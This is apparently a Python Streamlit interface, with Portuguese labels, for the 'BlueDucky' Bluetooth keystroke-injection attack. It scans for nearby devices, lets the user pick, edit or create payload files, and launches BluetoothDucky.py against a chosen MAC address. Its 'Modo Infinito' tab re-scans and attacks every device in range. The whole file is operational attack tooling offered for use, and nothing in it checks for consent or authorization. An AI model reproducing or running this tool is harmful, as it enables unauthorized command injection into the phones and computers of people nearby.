import streamlit as st
import os
import re
import asyncio
from bleak import BleakScanner
import subprocess

# Função para verificar e ativar o adaptador Bluetooth hci0
def check_and_activate_adapter():
    try:
        # Verifica o status do adaptador hci0
        result = subprocess.run(["hciconfig", "hci0"], capture_output=True, text=True)
        if "DOWN" in result.stdout:
            st.warning("Adaptador hci0 está DOWN. Ativando...")
            subprocess.run(["sudo", "hciconfig", "hci0", "up"], check=True)
            st.success("Adaptador hci0 ativado.")
        else:
            st.success("Adaptador hci0 está UP.")
    except Exception as e:
        st.error(f"Erro ao verificar ou ativar o adaptador: {str(e)}")

# Função para escanear dispositivos Bluetooth
async def scan_for_devices():
    devices = await BleakScanner.discover()
    return devices

# Função para validar endereço MAC
def is_valid_mac_address(mac_address):
    mac_address_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return mac_address_pattern.match(mac_address) is not None

# Função para listar arquivos de payloads
def list_payloads():
    payload_dir = "payloads"
    return [f for f in os.listdir(payload_dir) if os.path.isfile(os.path.join(payload_dir, f))]

# Função para executar o ataque usando BluetoothDucky.py e mostrar a saída em tempo real
def execute_attack(target_address, payload):
    # Copiar o payload selecionado para payload.txt
    try:
        with open(f"payloads/{payload}", "r") as src_file:
            with open("payload.txt", "w") as dest_file:
                dest_file.write(src_file.read())
        
        command = ["python3", "BluetoothDucky.py", "-i", "hci0", "-t", target_address]
        
        # Executar o comando e capturar a saída em tempo real
        with st.spinner("Executando ataque..."):
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Exibir a saída em tempo real
            while True:
                output = process.stdout.readline()
                if output and process.poll() is not None:
                    break
                if output:
                    st.text(output.strip())  # Exibe a linha de saída no Streamlit
            
            # Captura erros se houver
            stderr_output = process.stderr.read()
            if 'Payload execution completed.' in stderr_output.strip():
                st.success('Payload executado com sucesso!')
            else:
                st.error(f"Erro ao executar o ataque: {stderr_output.strip()}")
    
    except Exception as e:
        st.error(f"Erro ao copiar payload ou executar ataque: {str(e)}")

# Página do BlueDucky
st.title("BlueDucky - Bluetooth Device Attacker")

# Verificar e ativar o adaptador Bluetooth ao iniciar a página
check_and_activate_adapter()

# Inicializa a lista de dispositivos na sessão
if 'devices' not in st.session_state:
    st.session_state.devices = []

# Criar abas para ataque, editar e criar templates, e modo infinito
tab1, tab2, tab3, tab4 = st.tabs(["Ataque", "Editar Payload", "Criar Payload", "Modo Infinito"])

### Aba 1: Ataque ###
with tab1:
    # Escanear dispositivos Bluetooth
    if st.button("Escanear Dispositivos"):
        st.session_state.devices = asyncio.run(scan_for_devices())
        if not st.session_state.devices:
            st.warning("Nenhum dispositivo encontrado.")

    # Se houver dispositivos encontrados, exibir opções de seleção
    if st.session_state.devices:
        st.text(st.session_state.devices)
        device_names = [f"{device.name} ({device.address})" for device in st.session_state.devices]
        selected_device = st.radio("Selecione um dispositivo:", device_names)

        # Selecionar Payload
        payload_options = list_payloads()
        selected_payload = st.selectbox("Selecione um Payload:", payload_options, key="selected_payload")

        # Atacar dispositivo selecionado com o payload escolhido
        if selected_device and selected_payload:
            target_address = selected_device.split('(')[-1].strip(' )')
            if st.button("Atacar Dispositivo"):
                if is_valid_mac_address(target_address):
                    execute_attack(target_address, selected_payload)
                else:
                    st.error("Endereço MAC inválido.")

### Aba 2: Editar Payload ###
with tab2:
    st.subheader("Editar Payload")
    
    # Listar templates existentes para edição
    existing_templates = list_payloads()
    
    template_to_edit = st.selectbox("Selecione um template para editar:", existing_templates, key="template_to_edit")
    
    if template_to_edit:
        with open(f"payloads/{template_to_edit}", "r") as f:
            content = f.read()
        
        new_content = st.text_area("Conteúdo do Template:", value=content, height=300)
        
        if st.button("Salvar Alterações"):
            with open(f"payloads/{template_to_edit}", "w") as f:
                f.write(new_content)
            st.success(f"Template '{template_to_edit}' salvo com sucesso!")

### Aba 3: Criar Novo Payload ###
with tab3:
    st.subheader("Criar Novo Payload")
    
    new_template_name = st.text_input("Nome do novo template:")
    
    new_template_content = st.text_area("Conteúdo do novo template:", height=300)
    
    if st.button("Criar Template"):
        if new_template_name and new_template_content:
            with open(f"payloads/{new_template_name}", "w") as f:
                f.write(new_template_content)
            st.success(f"Novo template '{new_template_name}' criado com sucesso!")
        else:
            st.error("Por favor, preencha todos os campos.")

### Aba 4: Modo Infinito ###
with tab4:
    st.subheader("Modo Infinito")
    
    # Selecionar Payload para modo infinito
    infinite_payload_options = list_payloads()
    infinite_selected_payload = st.selectbox("Selecione um Payload:", infinite_payload_options, key="infinite_selected_payload")

    if infinite_selected_payload and st.button("Atacar Todos os Dispositivos"):
        # Escanear dispositivos Bluetooth novamente para obter alvos atualizados
        targets = asyncio.run(scan_for_devices())
        
        attack_results = []
        
        for device in targets:
            target_address = device.address
            
            # Executa o ataque em cada dispositivo encontrado
            execute_attack(target_address, infinite_selected_payload)
            
            attack_results.append((target_address, True))  # Marcar como concluído
        
        # Exibir resultados dos ataques em um checklist
        for address, success in attack_results:
            status = "Concluído" if success else "Pendente"
            st.checkbox(f"Ataque em {address}: {status}", value=success)

# Instruções adicionais na parte inferior da página
st.subheader("Instruções")
st.write("""
Este aplicativo permite escanear dispositivos Bluetooth e atacar um dispositivo específico.
1. Clique em "Escanear Dispositivos" para encontrar dispositivos próximos.
2. Selecione um dispositivo da lista.
3. Escolha um payload da lista.
4. Clique em "Atacar Dispositivo" para iniciar o ataque.
5. Na aba 'Modo Infinito', selecione um payload e clique em 'Atacar Todos os Dispositivos' para atacar todos os dispositivos encontrados.
""")